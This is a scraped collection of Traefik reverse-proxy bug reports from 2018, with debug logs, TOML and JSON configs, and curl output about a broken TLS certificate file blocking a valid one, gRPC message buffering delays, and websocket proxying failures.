{"level":"debug","msg":"adding tlsclientheaders middleware for frontend frontend-host-address-api-sandbox-updatron-com-6","time":"2018-10-11t20:08:09z"}
{"level":"debug","msg":"creating backend backend-address-api","time":"2018-10-11t20:08:09z"}
{"level":"debug","msg":"wiring frontend frontend-host-address-api-sandbox-updatron-com-6 to entrypoint http","time":"2018-10-11t20:08:09z"}
{"level":"debug","msg":"configuration received from provider docker: {\\"backends\\":{\\"backend-address-api\\":{\\"servers\\":{\\"server-address-api-772a04eb7a285cf6dc59117b66b32878\\":{\\"url\\":\\" ",\\"weight\\":1}},\\"loadbalancer\\":{\\"method\\":\\"wrr\\"},\\"buffering\\":{\\"retryexpression\\":\\"(isnetworkerror() || responsecode() == 502) \\\\u0026\\\\u0026 attempts() \\\\u003c= 1\\"}},\\"backend-apps-schema-registry\\":{\\"servers\\":{\\"server-apps-schema-registry-50a217b7fb8fd5535885d1d982f40686\\":{\\"url\\":\\" ",\\"weight\\":1}},\\"loadbalancer\\":{\\"method\\":\\"wrr\\"}},\\"backend-homeservices-api\\":{\\"servers\\":{\\"server-homeservices-api-8104d5f032d5228ae914880adbd8061d\\":{\\"url\\":\\" ",\\"weight\\":1}},\\"loadbalancer\\":{\\"method\\":\\"wrr\\"}},\\"backend-moveiq-api\\":{\\"servers\\":{\\"server-moveiq-api-77f55147b12732c79e420317cd2113c2\\":{\\"url\\":\\" ",\\"weight\\":1}},\\"loadbalancer\\":{\\"method\\":\\"wrr\\"}},\\"backend-property-api\\":{\\"servers\\":{\\"server-property-api-dfc2c742d71e4c5cb8ca8e9d4a0886f9\\":{\\"url\\":\\" ",\\"weight\\":1}},\\"loadbalancer\\":{\\"method\\":\\"wrr\\"}},\\"backend-rover-flow-controller\\":{\\"servers\\":{\\"server-rover-flow-controller-b514fdf430ae35d825d73358b1d148e1\\":{\\"url\\":\\" ",\\"weight\\":1}},\\"loadbalancer\\":{\\"method\\":\\"wrr\\"}},\\"backend-rover-state-observer\\":{\\"servers\\":{\\"server-rover-state-observer-fca84cdd216f828a248f6eaf8d596efe\\":{\\"url\\":\\" ",\\"weight\\":1}},\\"loadbalancer\\":{\\"method\\":\\"wrr\\"}},\\"backend-utility-api\\":{\\"servers\\":{\\"server-utility-api-76f981efd58bc6c2368214b14347ef47\\":{\\"url\\":\\" ",\\"weight\\":1}},\\"loadbalancer\\":{\\"method\\":\\"wrr\\"}}},\\"frontends\\":{\\"frontend-host-address-api-sandbox-updatron-com-6\\":{\\"entrypoints\\":[\\"http\\"],\\"backend\\":\\"backend-address-api\\",\\"routes\\":{\\"route-frontend-host-address-api-sandbox-updatron-com-6\\":{\\"rule\\":\\"host:address-api.sandbox.updatron.com\\"}},\\"passhostheader\\":true,\\"priority\\":0,\\"basicauth\\":null},\\"frontend-host-apps-schema-registry-sandbox-updatron-com-4\\":{\\"entrypoints\\":[\\"http\\"],\\"backend\\":\\"backend-apps-schema-registry\\",\\"routes\\":{\\"route-frontend-host-apps-schema-registry-sandbox-updatron-com-4\\":{\\"rule\\":\\"host:apps-schema-registry.sandbox.updatron.com\\"}},\\"passhostheader\\":true,\\"priority\\":0,\\"basicauth\\":null},\\"frontend-host-homeservices-api-sandbox-updatron-com-5\\":{\\"entrypoints\\":[\\"http\\"],\\"backend\\":\\"backend-homeservices-api\\",\\"routes\\":{\\"route-frontend-host-homeservices-api-sandbox-updatron-com-5\\":{\\"rule\\":\\"host:homeservices-api.sandbox.updatron.com\\"}},\\"passhostheader\\":true,\\"priority\\":0,\\"basicauth\\":null},\\"frontend-host-moveiq-api-sandbox-updatron-com-3\\":{\\"entrypoints\\":[\\"http\\"],\\"backend\\":\\"backend-moveiq-api\\",\\"routes\\":{\\"route-frontend-host-moveiq-api-sandbox-updatron-com-3\\":{\\"rule\\":\\"host:moveiq-api.sandbox.updatron.com\\"}},\\"passhostheader\\":true,\\"priority\\":0,\\"basicauth\\":null},\\"frontend-host-property-api-sandbox-updatron-com-7\\":{\\"entrypoints\\":[\\"http\\"],\\"backend\\":\\"backend-property-api\\",\\"routes\\":{\\"route-frontend-host-property-api-sandbox-updatron-com-7\\":{\\"rule\\":\\"host:property-api.sandbox.updatron.com\\"}},\\"passhostheader\\":true,\\"priority\\":0,\\"basicauth\\":null},\\"frontend-host-rover-flow-controller-sandbox-updatron-com-1\\":{\\"entrypoints\\":[\\"http\\"],\\"backend\\":\\"backend-rover-flow-controller\\",\\"routes\\":{\\"route-frontend-host-rover-flow-controller-sandbox-updatron-com-1\\":{\\"rule\\":\\"host:rover-flow-controller.sandbox.updatron.com\\"}},\\"passhostheader\\":true,\\"priority\\":0,\\"basicauth\\":null},\\"frontend-host-rover-state-observer-sandbox-updatron-com-2\\":{\\"entrypoints\\":[\\"http\\"],\\"backend\\":\\"backend-rover-state-observer\\",\\"routes\\":{\\"route-frontend-host-rover-state-observer-sandbox-updatron-com-2\\":{\\"rule\\":\\"host:rover-state-observer.sandbox.updatron.com\\"}},\\"passhostheader\\":true,\\"priority\\":0,\\"basicauth\\":null},\\"frontend-host-utility-api-sandbox-updatron-com-0\\":{\\"entrypoints\\":[\\"http\\"],\\"backend\\":\\"backend-utility-api\\",\\"routes\\":{\\"route-frontend-host-utility-api-sandbox-updatron-com-0\\":{\\"rule\\":\\"host:utility-api.sandbox.updatron.com\\"}},\\"passhostheader\\":true,\\"priority\\":0,\\"basicauth\\":null}}}","time":"2018-10-11t20:08:09z"}
{"level":"debug","msg":"alllabelsmap[:map[traefik.backend.loadbalancer.swarm:true traefik.docker.network:gateway_public-network traefik.enable:true traefik.port:3000]]","time":"2018-10-11t20:08:09z"}
{"level":"debug","msg":"originlabelsmap[traefik.port:3000 com.docker.stack.image:updater/property-api:56170 com.docker.stack.namespace:property traefik.backend.loadbalancer.swarm:true traefik.docker.network:gateway_public-network traefik.enable:true]","time":"2018-10-11t20:08:09z"}
{"level":"debug","msg":"alllabelsmap[:map[traefik.enable:true traefik.port:3000 traefik.backend.buffering.retryexpression:(isnetworkerror() || responsecode() == 502) \\u0026\\u0026 attempts() \\u003c= 1 traefik.backend.loadbalancer.swarm:true traefik.docker.network:gateway_public-network]]","time":"2018-10-11t20:08:09z"}
{"level":"debug","msg":"originlabelsmap[traefik.port:3000 com.docker.stack.image:updater/address-api:56290 com.docker.stack.namespace:address traefik.backend.buffering.retryexpression:(isnetworkerror() || responsecode() == 502) \\u0026\\u0026 attempts() \\u003c= 1 traefik.backend.loadbalancer.swarm:true traefik.docker.network:gateway_public-network traefik.enable:true]","time":"2018-10-11t20:08:09z"}
<details> ```json
{ "lifecycle": { "requestacceptgracetimeout": 0, "gracetimeout": 0 }, "gracetimeout": 0, "debug": false, "checknewversion": true, "sendanonymoususage": false, "accesslogsfile": "", "accesslog": { "file": "/var/log/traefik/traefik.log", "format": "common" }, "traefiklogsfile": "", "traefiklog": null, "tracing": { "backend": "jaeger", "servicename": "traefik", "spannamelimit": 0, "jaeger": null, "zipkin": null, "datadog": null }, "loglevel": "debug", "entrypoints": { "api": { "address": "xxxx", "tls": null, "redirect": null, "auth": null, "whitelistsourcerange": null, "whitelist": null, "compress": false, "proxyprotocol": null, "forwardedheaders": null }, "http": { "address": "xxxx", "tls": null, "redirect": null, "auth": null, "whitelistsourcerange": null, "whitelist": null, "compress": true, "proxyprotocol": null, "forwardedheaders": null }, "ping": { "address": "xxxx", "tls": null, "redirect": null, "auth": null, "whitelistsourcerange": null, "whitelist": null, "compress": false, "proxyprotocol": null, "forwardedheaders": null } }, "cluster": null, "constraints": [], "acme": null, "defaultentrypoints": [ "http" ], "providersthrottleduration": 2000000000, "maxidleconnsperhost": 200, "idletimeout": 0, "insecureskipverify": false, "rootcas": null, "retry": { "attempts": 0 }, "healthcheck": { "interval": 30000000000 }, "respondingtimeouts": { "readtimeout": 0, "writetimeout": 0, "idletimeout": 180000000000 }, "forwardingtimeouts": null, "allowminweightzero": false, "web": null, "docker": null, "file": { "watch": true, "filename": "/etc/traefik/rules.toml", "constraints": null, "trace": false, "templateversion": 0, "debugloggeneratedtemplate": false, "directory": "", "traefikfile": "" }, "marathon": { "watch": false, "filename": "", "constraints": null, "trace": false, "templateversion": 0, "debugloggeneratedtemplate": false, "endpoint": "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx", "domain": "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx", "exposedbydefault": false, "groupsassubdomains": false, "dcostoken": "", "marathonlbcompatibility": false, "filtermarathonconstraints": false, "tls": null, "dialertimeout": 60000000000, "responseheadertimeout": 60000000000, "tlshandshaketimeout": 5000000000, "keepalive": 10000000000, "forcetaskhostname": false, "basic": null, "respectreadinesschecks": true }, "consul": null, "consulcatalog": null, "etcd": null, "zookeeper": null, "boltdb": null, "kubernetes": null, "mesos": null, "eureka": null, "ecs": null, "rancher": null, "dynamodb": null, "servicefabric": null, "rest": null, "api": { "entrypoint": "api", "dashboard": true, "debug": false, "currentconfigurations": null, "statistics": null, "dashboardassets": null }, "metrics": { "prometheus": { "buckets": [ 0.1, 0.3, 1.2, 5 ], "entrypoint": "api" }, "datadog": null, "statsd": null, "influxdb": null }, "ping": { "entrypoint": "ping" }, "hostresolver": null, "configfile": "/etc/traefik/traefik.toml"
``` </details>
n/a ### if applicable, please paste the log output in debug level (`--loglevel=debug` switch) n/a
here are the details of what i discovered
this is the full config i'm using: ```toml
maxidleconnsperhost = 10000
loglevel = "debug" [lifecycle]
gracetimeout = 10 defaultentrypoints = ["http"]
[entrypoints] [entrypoints.http] address = ":80" [entrypoints.https] address = ":443" [entrypoints.https.tls] [entrypoints.traefik] address = "127.0.0.1:8082" [file]
watch = true
directory = "conf.d/" [api] dashboard = true [marathon]
endpoint = " "
watch = true
domain = "marathon"
groupsassubdomains = true
``` supose you have two configs for two certificates: one good and one bad
the bad config can be this one: ```toml
[[tls]] entrypoints = ["https"] [tls.certificate] certfile = "/etc/letsencrypt/broken" keyfile = "/etc/letsencrypt/broken"
``` and the good one could be a `--test-cert` generated by let's encrypt cetbot
both files are inside `conf.d/` folder, which traefik is watching for changes
when you start traefik with this setup you have this logs: ```console
/opt/traefik # ./traefik -c config.toml
info[2018-10-10t11:31:15-03:00] using toml configuration file /opt/traefik/config.toml
info[2018-10-10t11:31:15-03:00] traefik version v1.6.5 built on 2018-07-10_03:54:03pm
info[2018-10-10t11:31:15-03:00]
stats collection is disabled.
help us improve traefik by turning this feature on :)
more details on: #collected-data debu[2018-10-10t11:31:15-03:00] global configuration loaded {"lifecycle":{"requestacceptgracetimeout":0,"gracetimeout":10000000000},"gracetimeout":0,"debug":false,"checknewversion":true,"sendanonymoususage":false,"accesslogsfile":"","accesslog":null,"traefiklogsfile":"","traefiklog":null,"tracing":null,"loglevel":"debug","entrypoints":{"http":{"address":":80","tls":null,"redirect":null,"auth":null,"whitelistsourcerange":null,"whitelist":null,"compress":false,"proxyprotocol":null,"forwardedheaders":{"insecure":true,"trustedips":null}},"https":{"address":":443","tls":{"minversion":"","ciphersuites":null,"certificates":null,"clientcafiles":null,"clientca":{"files":null,"optional":false}},"redirect":null,"auth":null,"whitelistsourcerange":null,"whitelist":null,"compress":false,"proxyprotocol":null,"forwardedheaders":{"insecure":true,"trustedips":null}},"traefik":{"address":"127.0.0.1:8082","tls":null,"redirect":null,"auth":null,"whitelistsourcerange":null,"whitelist":null,"compress":false,"proxyprotocol":null,"forwardedheaders":{"insecure":true,"trustedips":null}}},"cluster":null,"constraints":[],"acme":null,"defaultentrypoints":["http"],"providersthrottleduration":2000000000,"maxidleconnsperhost":10000,"idletimeout":0,"insecureskipverify":false,"rootcas":null,"retry":null,"healthcheck":{"interval":30000000000},"respondingtimeouts":null,"forwardingtimeouts":null,"allowminweightzero":false,"web":null,"docker":null,"file":{"watch":true,"filename":"","constraints":null,"trace":false,"templateversion":0,"debugloggeneratedtemplate":false,"directory":"conf.d/","traefikfile":"/opt/traefik/config.toml"},"marathon":{"watch":true,"filename":"","constraints":[],"trace":false,"templateversion":2,"debugloggeneratedtemplate":false,"endpoint":" ","domain":"marathon","exposedbydefault":true,"groupsassubdomains":true,"dcostoken":"","marathonlbcompatibility":false,"filtermarathonconstraints":false,"tls":null,"dialertimeout":60000000000,"keepalive":10000000000,"forcetaskhostname":false,"basic":null,"respectreadinesschecks":false},"consul":null,"consulcatalog":null,"etcd":null,"zookeeper":null,"boltdb":null,"kubernetes":null,"mesos":null,"eureka":null,"ecs":null,"rancher":null,"dynamodb":null,"servicefabric":null,"rest":null,"api":{"entrypoint":"traefik","dashboard":true,"debug":false,"currentconfigurations":null,"statistics":null},"metrics":null,"ping":null}
info[2018-10-10t11:31:15-03:00] preparing server http &{address::80 tls:<nil> redirect:<nil> auth:<nil> whitelistsourcerange:[] whitelist:<nil> compress:false proxyprotocol:<nil> forwardedheaders: } with readtimeout=0s writetimeout=0s idletimeout=3m0s
info[2018-10-10t11:31:15-03:00] preparing server https &{address::443 tls: redirect:<nil> auth:<nil> whitelistsourcerange:[] whitelist:<nil> compress:false proxyprotocol:<nil> forwardedheaders: } with readtimeout=0s writetimeout=0s idletimeout=3m0s
info[2018-10-10t11:31:15-03:00] starting server on :80
info[2018-10-10t11:31:15-03:00] preparing server traefik &{address:127.0.0.1:8082 tls:<nil> redirect:<nil> auth:<nil> whitelistsourcerange:[] whitelist:<nil> compress:false proxyprotocol:<nil> forwardedheaders: } with readtimeout=0s writetimeout=0s idletimeout=3m0s
info[2018-10-10t11:31:15-03:00] starting server on :443
info[2018-10-10t11:31:15-03:00] starting provider configuration.provideraggregator {}
info[2018-10-10t11:31:15-03:00] starting server on 127.0.0.1:8082
info[2018-10-10t11:31:15-03:00] starting provider *marathon.provider {"watch":true,"filename":"","constraints":[],"trace":false,"templateversion":2,"debugloggeneratedtemplate":false,"endpoint":" ","domain":"marathon","exposedbydefault":true,"groupsassubdomains":true,"dcostoken":"","marathonlbcompatibility":false,"filtermarathonconstraints":false,"tls":null,"dialertimeout":60000000000,"keepalive":10000000000,"forcetaskhostname":false,"basic":null,"respectreadinesschecks":false}
info[2018-10-10t11:31:15-03:00] starting provider *file.provider {"watch":true,"filename":"","constraints":null,"trace":false,"templateversion":0,"debugloggeneratedtemplate":false,"directory":"conf.d/","traefikfile":"/opt/traefik/config.toml"}
warn[2018-10-10t11:31:15-03:00] clienttls is nil
debu[2018-10-10t11:31:15-03:00] configuration received from provider file: {"tls":[{"entrypoints":["https"],"certificate":{"certfile":"/etc/letsencrypt/archive/<redacted>/fullchain1.pem","keyfile":"/etc/letsencrypt/archive/<redacted>/privkey1.pem"}},{"entrypoints":["https"],"certificate":{"certfile":"/etc/letsencrypt/broken","keyfile":"/etc/letsencrypt/broken"}}]}
debu[2018-10-10t11:31:15-03:00] add certificate for domains <redacted>
erro[2018-10-10t11:31:15-03:00] error loading new configuration, aborted unable to generate tls certificate : tls: failed to find any pem data in certificate input
debu[2018-10-10t11:31:16-03:00] no certificate provided dynamically can check the domain "<redacted>", a per default certificate will be used.
erro[2018-10-10t11:31:18-03:00] failed to retrieve marathon applications: all the marathon hosts are presently down
debu[2018-10-10t11:31:18-03:00] no certificate provided dynamically can check the domain "<redacted>", a per default certificate will be used.
debu[2018-10-10t11:31:20-03:00] no certificate provided dynamically can check the domain "<redacted>", a per default certificate will be used.
debu[2018-10-10t11:31:22-03:00] no certificate provided dynamically can check the domain "<redacted>", a per default certificate will be used.
debu[2018-10-10t11:31:25-03:00] no certificate provided dynamically can check the domain "<redacted>", a per default certificate will be used.
^cinfo[2018-10-10t11:31:26-03:00] i have to go...
info[2018-10-10t11:31:26-03:00] stopping server gracefully
debu[2018-10-10t11:31:26-03:00] waiting 10s seconds before killing connections on entrypoint traefik...
debu[2018-10-10t11:31:26-03:00] waiting 10s seconds before killing connections on entrypoint http...
debu[2018-10-10t11:31:26-03:00] waiting 10s seconds before killing connections on entrypoint https...
debu[2018-10-10t11:31:26-03:00] entrypoint http closed
debu[2018-10-10t11:31:26-03:00] entrypoint traefik closed
debu[2018-10-10t11:31:26-03:00] entrypoint https closed
info[2018-10-10t11:31:26-03:00] server stopped
info[2018-10-10t11:31:26-03:00] shutting down
``` during this run, i made this request: ```console
$ curl -svk --resolve <redacted>:443:127.0.0.1 2>&1 | grep -a 5 'server certificate:' * server certificate:
* subject: cn=traefik default cert
* start date: oct 10 14:32:34 2018 gmt
* expire date: oct 10 14:32:34 2019 gmt
* issuer: cn=traefik default cert
* ssl certificate verify result: unable to get local issuer certificate (20), continuing anyway.
``` traefiks keeps its default self-generated certificate, even thought there is a correct configuration file inside `conf.d/`
if i remove the broken file from `conf.d/` and restart, all works
/opt/traefik # ./traefik -c config.toml
info[2018-10-10t12:18:34-03:00] using toml configuration file /opt/traefik/config.toml
info[2018-10-10t12:18:34-03:00] traefik version v1.6.5 built on 2018-07-10_03:54:03pm
info[2018-10-10t12:18:34-03:00]
stats collection is disabled.
help us improve traefik by turning this feature on :)
more details on: #collected-data debu[2018-10-10t12:18:34-03:00] global configuration loaded {"lifecycle":{"requestacceptgracetimeout":0,"gracetimeout":10000000000},"gracetimeout":0,"debug":false,"checknewversion":true,"sendanonymoususage":false,"accesslogsfile":"","accesslog":null,"traefiklogsfile":"","traefiklog":null,"tracing":null,"loglevel":"debug","entrypoints":{"http":{"address":":80","tls":null,"redirect":null,"auth":null,"whitelistsourcerange":null,"whitelist":null,"compress":false,"proxyprotocol":null,"forwardedheaders":{"insecure":true,"trustedips":null}},"https":{"address":":443","tls":{"minversion":"","ciphersuites":null,"certificates":null,"clientcafiles":null,"clientca":{"files":null,"optional":false}},"redirect":null,"auth":null,"whitelistsourcerange":null,"whitelist":null,"compress":false,"proxyprotocol":null,"forwardedheaders":{"insecure":true,"trustedips":null}},"traefik":{"address":"127.0.0.1:8082","tls":null,"redirect":null,"auth":null,"whitelistsourcerange":null,"whitelist":null,"compress":false,"proxyprotocol":null,"forwardedheaders":{"insecure":true,"trustedips":null}}},"cluster":null,"constraints":[],"acme":null,"defaultentrypoints":["http"],"providersthrottleduration":2000000000,"maxidleconnsperhost":10000,"idletimeout":0,"insecureskipverify":false,"rootcas":null,"retry":null,"healthcheck":{"interval":30000000000},"respondingtimeouts":null,"forwardingtimeouts":null,"allowminweightzero":false,"web":null,"docker":null,"file":{"watch":true,"filename":"","constraints":null,"trace":false,"templateversion":0,"debugloggeneratedtemplate":false,"directory":"conf.d/","traefikfile":"/opt/traefik/config.toml"},"marathon":{"watch":true,"filename":"","constraints":[],"trace":false,"templateversion":2,"debugloggeneratedtemplate":false,"endpoint":" ","domain":"marathon","exposedbydefault":true,"groupsassubdomains":true,"dcostoken":"","marathonlbcompatibility":false,"filtermarathonconstraints":false,"tls":null,"dialertimeout":60000000000,"keepalive":10000000000,"forcetaskhostname":false,"basic":null,"respectreadinesschecks":false},"consul":null,"consulcatalog":null,"etcd":null,"zookeeper":null,"boltdb":null,"kubernetes":null,"mesos":null,"eureka":null,"ecs":null,"rancher":null,"dynamodb":null,"servicefabric":null,"rest":null,"api":{"entrypoint":"traefik","dashboard":true,"debug":false,"currentconfigurations":null,"statistics":null},"metrics":null,"ping":null}
info[2018-10-10t12:18:34-03:00] preparing server http &{address::80 tls:<nil> redirect:<nil> auth:<nil> whitelistsourcerange:[] whitelist:<nil> compress:false proxyprotocol:<nil> forwardedheaders: } with readtimeout=0s writetimeout=0s idletimeout=3m0s
info[2018-10-10t12:18:34-03:00] preparing server https &{address::443 tls: redirect:<nil> auth:<nil> whitelistsourcerange:[] whitelist:<nil> compress:false proxyprotocol:<nil> forwardedheaders: } with readtimeout=0s writetimeout=0s idletimeout=3m0s
info[2018-10-10t12:18:34-03:00] starting server on :80
info[2018-10-10t12:18:34-03:00] preparing server traefik &{address:127.0.0.1:8082 tls:<nil> redirect:<nil> auth:<nil> whitelistsourcerange:[] whitelist:<nil> compress:false proxyprotocol:<nil> forwardedheaders: } with readtimeout=0s writetimeout=0s idletimeout=3m0s
info[2018-10-10t12:18:34-03:00] starting server on :443
info[2018-10-10t12:18:34-03:00] starting provider configuration.provideraggregator {}
info[2018-10-10t12:18:34-03:00] starting server on 127.0.0.1:8082
info[2018-10-10t12:18:34-03:00] starting provider *marathon.provider {"watch":true,"filename":"","constraints":[],"trace":false,"templateversion":2,"debugloggeneratedtemplate":false,"endpoint":" ","domain":"marathon","exposedbydefault":true,"groupsassubdomains":true,"dcostoken":"","marathonlbcompatibility":false,"filtermarathonconstraints":false,"tls":null,"dialertimeout":60000000000,"keepalive":10000000000,"forcetaskhostname":false,"basic":null,"respectreadinesschecks":false}
info[2018-10-10t12:18:34-03:00] starting provider *file.provider {"watch":true,"filename":"","constraints":null,"trace":false,"templateversion":0,"debugloggeneratedtemplate":false,"directory":"conf.d/","traefikfile":"/opt/traefik/config.toml"}
warn[2018-10-10t12:18:34-03:00] clienttls is nil
debu[2018-10-10t12:18:34-03:00] configuration received from provider file: {"tls":[{"entrypoints":["https"],"certificate":{"certfile":"/etc/letsencrypt/archive/<redacted>/fullchain1.pem","keyfile":"/etc/letsencrypt/archive/<redacted>/privkey1.pem"}}]}
debu[2018-10-10t12:18:34-03:00] add certificate for domains <redacted>
info[2018-10-10t12:18:34-03:00] server configuration reloaded on 127.0.0.1:8082
info[2018-10-10t12:18:34-03:00] server configuration reloaded on :80
info[2018-10-10t12:18:34-03:00] server configuration reloaded on :443
erro[2018-10-10t12:18:38-03:00] failed to retrieve marathon applications: all the marathon hosts are presently down
^cinfo[2018-10-10t12:19:11-03:00] i have to go...
info[2018-10-10t12:19:11-03:00] stopping server gracefully
debu[2018-10-10t12:19:11-03:00] waiting 10s seconds before killing connections on entrypoint https...
debu[2018-10-10t12:19:11-03:00] entrypoint https closed
debu[2018-10-10t12:19:11-03:00] waiting 10s seconds before killing connections on entrypoint traefik...
debu[2018-10-10t12:19:11-03:00] waiting 10s seconds before killing connections on entrypoint http...
debu[2018-10-10t12:19:11-03:00] entrypoint http closed
debu[2018-10-10t12:19:11-03:00] entrypoint traefik closed
info[2018-10-10t12:19:11-03:00] server stopped
info[2018-10-10t12:19:11-03:00] shutting down
/opt/traefik #
``` curl: ```console
$ curl -svk --resolve <redacted>:443:127.0.0.1 2>&1 | grep -a 5 'server certificate:'
* server certificate:
* subject: cn=<redacted>
* start date: oct 10 12:53:35 2018 gmt
* expire date: jan 8 12:53:35 2019 gmt
* issuer: cn=fake le intermediate x1
* ssl certificate verify result: unable to get local issuer certificate (20), continuing anyway.
``` also, if i remove the broken file while traefik is still running, all works too
that is, the response that `curl` receives shows the right certificate (not the self-generated by traefik) if you confirm that this is a problem i think this log line: ```
erro[2018-10-10t11:31:15-03:00] error loading new configuration, aborted unable to generate tls certificate : tls: failed to find any pem data in certificate input
``` could show which configuration provider caused the error
docker 18.06, ubuntu 18.04
``` we have the same api implemented using websocket (no problems here both with traefik and envoy) and also have the same api running behind envoy without problems
does not matter if using h2c or https with self signed cert + insecureskipverify
from what i tested it works as long as the message has more than 4096 bytes
any smaller message (3kb ...) gets buffered and send with delay (consistently around 100ms - avg
rtt is 20ms in my setup)
ignoring traefik and doing direct communication (grpc client - server) does not have this issue.
loglevel = "debug" defaultentrypoints = ["http"] [entrypoints] [entrypoints.http] address = ":80" [file] [frontends] [frontends.staging] backend = "staging" [frontends.staging.routes.server1] rule = "host:localhost" [backends] [backends.staging] [backends.staging.servers.api] url = " "
``` anyone can use this config to reproducing this bug.
save the content to a file test.toml then run:
traefik -c test.toml
``` in another termail:
wscat -c "ws://localhost"
``` please install wscat if you don't have: `npm install -g wscat` ### if applicable, please paste the log output in debug level (`--loglevel=debug` switch) ```
debu[2018-10-10t16:49:31+08:00] vulcand/oxy/roundrobin/rr: begin servehttp on request request="{\\"method\\":\\"get\\",\\"url\\":{\\"scheme\\":\\"\\",\\"opaque\\":\\"\\",\\"user\\":null,\\"host\\":\\"\\",\\"path\\":\\"/\\",\\"rawpath\\":\\"\\",\\"forcequery\\":false,\\"rawquery\\":\\"\\",\\"fragment\\":\\"\\"},\\"proto\\":\\"http/1.1\\",\\"protomajor\\":1,\\"protominor\\":1,\\"header\\":{\\"connection\\":[\\"upgrade\\"],\\"sec-websocket-extensions\\":[\\"permessage-deflate; client_max_window_bits\\"],\\"sec-websocket-key\\":[\\"yoe9ghwluj7jeygo0m2wpg==\\"],\\"sec-websocket-version\\":[\\"13\\"],\\"upgrade\\":[\\"websocket\\"]},\\"contentlength\\":0,\\"transferencoding\\":null,\\"host\\":\\"1.us.api.foo.org:443\\",\\"form\\":null,\\"postform\\":null,\\"multipartform\\":null,\\"trailer\\":null,\\"remoteaddr\\":\\"171.210.196.254:19766\\",\\"requesturi\\":\\"/\\",\\"tls\\":null}"
debu[2018-10-10t16:49:31+08:00] vulcand/oxy/roundrobin/rr: forwarding this request to url forwardurl="wss://echo.websocket.org" request="{\\"method\\":\\"get\\",\\"url\\":{\\"scheme\\":\\"\\",\\"opaque\\":\\"\\",\\"user\\":null,\\"host\\":\\"\\",\\"path\\":\\"/\\",\\"rawpath\\":\\"\\",\\"forcequery\\":false,\\"rawquery\\":\\"\\",\\"fragment\\":\\"\\"},\\"proto\\":\\"http/1.1\\",\\"protomajor\\":1,\\"protominor\\":1,\\"header\\":{\\"connection\\":[\\"upgrade\\"],\\"sec-websocket-extensions\\":[\\"permessage-deflate; client_max_window_bits\\"],\\"sec-websocket-key\\":[\\"yoe9ghwluj7jeygo0m2wpg==\\"],\\"sec-websocket-version\\":[\\"13\\"],\\"upgrade\\":[\\"websocket\\"]},\\"contentlength\\":0,\\"transferencoding\\":null,\\"host\\":\\"1.us.api.foo.org:443\\",\\"form\\":null,\\"postform\\":null,\\"multipartform\\":null,\\"trailer\\":null,\\"remoteaddr\\":\\"171.210.196.254:19766\\",\\"requesturi\\":\\"/\\",\\"tls\\":null}"
debu[2018-10-10t16:49:31+08:00] vulcand/oxy/forward: begin servehttp on request request="{\\"method\\":\\"get\\",\\"url\\":{\\"scheme\\":\\"wss\\",\\"opaque\\":\\"\\",\\"user\\":null,\\"host\\":\\"echo.websocket.org\\",\\"path\\":\\"\\",\\"rawpath\\":\\"\\",\\"forcequery\\":false,\\"rawquery\\":\\"\\",\\"fragment\\":\\"\\"},\\"proto\\":\\"http/1.1\\",\\"protomajor\\":1,\\"protominor\\":1,\\"header\\":{\\"connection\\":[\\"upgrade\\"],\\"sec-websocket-extensions\\":[\\"permessage-deflate; client_max_window_bits\\"],\\"sec-websocket-key\\":[\\"yoe9ghwluj7jeygo0m2wpg==\\"],\\"sec-websocket-version\\":[\\"13\\"],\\"upgrade\\":[\\"websocket\\"]},\\"contentlength\\":0,\\"transferencoding\\":null,\\"host\\":\\"1.us.api.foo.org:443\\",\\"form\\":null,\\"postform\\":null,\\"multipartform\\":null,\\"trailer\\":null,\\"remoteaddr\\":\\"171.210.196.254:19766\\",\\"requesturi\\":\\"/\\",\\"tls\\":null}"
debu[2018-10-10t16:49:31+08:00] vulcand/oxy/forward/websocket: begin servehttp on request request="{\\"method\\":\\"get\\",\\"url\\":{\\"scheme\\":\\"wss\\",\\"opaque\\":\\"\\",\\"user\\":null,\\"host\\":\\"echo.websocket.org\\",\\"path\\":\\"\\",\\"rawpath\\":\\"\\",\\"forcequery\\":false,\\"rawquery\\":\\"\\",\\"fragment\\":\\"\\"},\\"proto\\":\\"http/1.1\\",\\"protomajor\\":1,\\"protominor\\":1,\\"header\\":{\\"connection\\":[\\"upgrade\\"],\\"sec-websocket-extensions\\":[\\"permessage-deflate; client_max_window_bits\\"],\\"sec-websocket-key\\":[\\"yoe9ghwluj7jeygo0m2wpg==\\"],\\"sec-websocket-version\\":[\\"13\\"],\\"upgrade\\":[\\"websocket\\"]},\\"contentlength\\":0,\\"transferencoding\\":null,\\"host\\":\\"1.us.api.foo.org:443\\",\\"form\\":null,\\"postform\\":null,\\"multipartform\\":null,\\"trailer\\":null,\\"remoteaddr\\":\\"171.210.196.254:19766\\",\\"requesturi\\":\\"/\\",\\"tls\\":null}"
erro[2018-10-10t16:49:32+08:00] vulcand/oxy/forward/websocket: error dialing "1.us.api.foo.org:443": websocket: bad handshake with resp: 404 404 not found
debu[2018-10-10t16:49:32+08:00] vulcand/oxy/forward/websocket: completed servehttp on request request="{\\"method\\":\\"get\\",\\"url\\":{\\"scheme\\":\\"wss\\",\\"opaque\\":\\"\\",\\"user\\":null "host\\":\\"echo.websocket.org\\",\\"path\\":\\"\\",\\"rawpath\\":\\"\\",\\"forcequery\\":false,\\"rawquery\\":\\"\\",\\"fragment\\":\\"\\"},\\"proto\\":\\"http/1.1\\",\\"protomajor\\":1,\\"protominor\\":1,\\"header\\":{\\"connection\\":[\\"upgrade\\"],\\"sec-websocket-extensions\\":[\\"permessage-deflate; client_max_window_bits\\"],\\"sec-websocket-key\\":[\\"yoe9ghwluj7jeygo0m2wpg==\\"],\\"sec-websocket-version\\":[\\"13\\"],\\"upgrade\\":[\\"websocket\\"]},\\"contentlength\\":0,\\"transferencoding\\":null,\\"host\\":\\"1.us.api.foo.org:443\\",\\"form\\":null,\\"postform\\":null,\\"multipartform\\":null,\\"trailer\\":null,\\"remoteaddr\\":\\"171.210.196.254:19766\\",\\"requesturi\\":\\"/\\",\\"tls\\":null}"
